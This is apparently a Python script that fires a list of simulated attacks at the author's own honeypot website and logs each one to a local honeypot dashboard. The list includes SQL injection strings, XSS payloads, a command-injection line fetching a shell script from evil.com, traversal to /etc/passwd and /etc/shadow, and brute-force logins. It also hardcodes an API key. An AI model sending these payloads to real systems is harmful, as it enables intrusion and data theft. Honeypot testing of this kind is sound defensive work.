"""
Attack Simulation → Target Website pe attack karo + Honeypot Server mein log karo
===================================================================================
Target:   https://honeypot-wimm.onrender.com  (deployed website)
Honeypot: http://localhost:5000               (local honeypot dashboard)

Run:  python simulate_attacks.py
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
from datetime import datetime

# ─── CONFIGURATION ────────────────────────────────────────
TARGET_SITE     = "https://honeypot-wimm.onrender.com"
HONEYPOT_SERVER = "http://localhost:5000"
HONEYPOT_API    = f"{HONEYPOT_SERVER}/api/logs"
API_KEY         = "nxglipojhjdbvbrvkbvkzhbfvuhf"     # .env se LOG_API_KEY
# ──────────────────────────────────────────────────────────

ATTACKS = [
    # (label, method, path, body_dict, user_agent, fake_ip)

    # --- Recon / Probing ---
    ("Recon: /admin",           "GET",  "/admin",         None, "Nikto/2.1.6",      "45.33.32.100"),
    ("Recon: /wp-admin",        "GET",  "/wp-admin",      None, "WPScan/3.8",       "45.33.32.100"),
    ("Recon: /.env",            "GET",  "/.env",          None, "curl/7.68.0",      "185.220.101.5"),
    ("Recon: /phpmyadmin",      "GET",  "/phpmyadmin",    None, "Nikto/2.1.6",      "185.220.101.5"),
    ("Recon: /config",          "GET",  "/config",        None, "curl/7.68.0",      "185.220.101.5"),
    ("Recon: /backup",          "GET",  "/backup",        None, "dirbuster/1.0",    "192.168.1.50"),

    # --- SQL Injection ---
    ("SQLi: OR 1=1",           "GET",  "/login?user=admin'+OR+'1'='1'--",              None, "sqlmap/1.7",  "103.25.40.12"),
    ("SQLi: UNION SELECT",     "GET",  "/search?q='+UNION+SELECT+username,password+FROM+users--", None, "sqlmap/1.7",  "103.25.40.12"),
    ("SQLi: DROP TABLE",       "GET",  "/api?q=1;DROP+TABLE+users--",                  None, "sqlmap/1.7",  "103.25.40.12"),

    # --- XSS ---
    ("XSS: script tag",        "GET",  "/search?q=<script>alert('XSS')</script>",      None, "Mozilla/5.0", "78.46.89.200"),
    ("XSS: img onerror",       "GET",  "/search?q=<img+src=x+onerror=alert(1)>",       None, "Mozilla/5.0", "78.46.89.200"),

    # --- RCE ---
    ("RCE: cmd injection",     "GET",  "/api?cmd=;wget+http://evil.com/shell.sh",      None, "curl/7.68.0", "23.94.12.77"),
    ("RCE: bash reverse shell","GET",  "/exec?cmd=/bin/bash+-i",                        None, "curl/7.68.0", "23.94.12.77"),

    # --- Path Traversal / LFI ---
    ("LFI: /etc/passwd",       "GET",  "/download?file=../../etc/passwd",               None, "Mozilla/5.0", "91.121.45.10"),
    ("LFI: /etc/shadow",       "GET",  "/view?path=../../../../etc/shadow",             None, "Mozilla/5.0", "91.121.45.10"),

    # --- Brute Force Login ---
    ("BruteForce: attempt 1",  "POST", "/login", {"email": "admin@target.com",  "password": "admin123"},   "Hydra/9.3",   "159.89.10.55"),
    ("BruteForce: attempt 2",  "POST", "/login", {"email": "admin@target.com",  "password": "password"},   "Hydra/9.3",   "159.89.10.55"),
    ("BruteForce: attempt 3",  "POST", "/login", {"email": "admin@target.com",  "password": "letmein"},    "Hydra/9.3",   "159.89.10.55"),
    ("BruteForce: attempt 4",  "POST", "/login", {"email": "root@admin.com",    "password": "toor"},       "Hydra/9.3",   "159.89.10.55"),
    ("BruteForce: attempt 5",  "POST", "/login", {"email": "hacker@evil.com",   "password": "qwerty"},     "Hydra/9.3",   "159.89.10.55"),

    # --- DDoS / Scanner tools ---
    ("Scan: nmap probe",       "GET",  "/robots.txt",     None, "nmap scripting engine",  "200.55.30.88"),
    ("Scan: gobuster dirs",    "GET",  "/secret",         None, "gobuster/3.1",           "200.55.30.88"),
]


def attack_target(method, path, body_dict, user_agent):
    """Send the actual attack to the target website."""
    url = TARGET_SITE + path
    data = urllib.parse.urlencode(body_dict).encode() if body_dict else None

    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", user_agent)
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status, "success"
    except urllib.error.HTTPError as e:
        return e.code, "failed"
    except Exception as e:
        return 0, f"error"


def send_to_honeypot(label, method, path, body_dict, user_agent, fake_ip, status):
    """Send the attack log to the local honeypot server via API."""
    payload_text = ""
    if body_dict:
        payload_text = urllib.parse.urlencode(body_dict)
    elif "?" in path:
        payload_text = path.split("?", 1)[1]

    log_data = {
        "source":     "target-website",
        "ip":         fake_ip,
        "user_agent": user_agent,
        "endpoint":   path.split("?")[0],
        "method":     method,
        "status":     status,
        "payload":    payload_text[:2000],
        "timestamp":  datetime.utcnow().isoformat(),
    }

    body = json.dumps(log_data).encode("utf-8")
    req = urllib.request.Request(HONEYPOT_API, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-API-KEY", API_KEY)

    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status
    except Exception as e:
        return f"ERR: {str(e)[:30]}"


def main():
    print("=" * 65)
    print("  HONEYPOT ATTACK SIMULATION")
    print(f"  Target website : {TARGET_SITE}")
    print(f"  Honeypot server: {HONEYPOT_SERVER}")
    print("=" * 65)

    # 1. Check target site
    print("\n[1] Checking target website...", end=" ", flush=True)
    try:
        r = urllib.request.urlopen(TARGET_SITE + "/", timeout=30)
        print(f"UP (status {r.status})")
    except Exception as e:
        print(f"WARN: {str(e)[:50]}")
        print("    Target may be sleeping (Render free tier). Continuing anyway...")

    # 2. Check honeypot server
    print("[2] Checking honeypot server...", end=" ", flush=True)
    try:
        r = urllib.request.urlopen(HONEYPOT_SERVER + "/", timeout=5)
        print(f"UP (status {r.status})")
    except Exception as e:
        print(f"DOWN: {str(e)[:50]}")
        print("    Make sure honeypot is running: python run.py")
        return

    # 3. Run attacks
    print(f"\n[3] Launching {len(ATTACKS)} attacks...\n")
    print(f"  {'ATTACK':<35} {'TARGET':>6}  {'HONEYPOT':>8}")
    print("  " + "-" * 55)

    sent = 0
    for label, method, path, body, ua, ip in ATTACKS:
        # Attack the target website
        target_status, status_text = attack_target(method, path, body, ua)

        # Send log to honeypot server
        hp_status = send_to_honeypot(label, method, path, body, ua, ip, status_text)

        icon = "✓" if hp_status == 201 else "✗"
        print(f"  {icon} {label:<33} {target_status:>6}  {hp_status:>8}")

        if hp_status == 201:
            sent += 1

        time.sleep(0.4)

    # 4. Summary
    print()
    print("=" * 65)
    print(f"  RESULTS: {sent}/{len(ATTACKS)} attacks logged in honeypot")
    print()
    print("  Ab browser mein jaao aur logs dekho:")
    print(f"    {HONEYPOT_SERVER}/login      →  login karo")
    print(f"    {HONEYPOT_SERVER}/attacklogs  →  attack logs")
    print(f"    {HONEYPOT_SERVER}/dashboard   →  dashboard")
    print(f"    {HONEYPOT_SERVER}/logs        →  external logs")
    print("=" * 65)


if __name__ == "__main__":
    main()
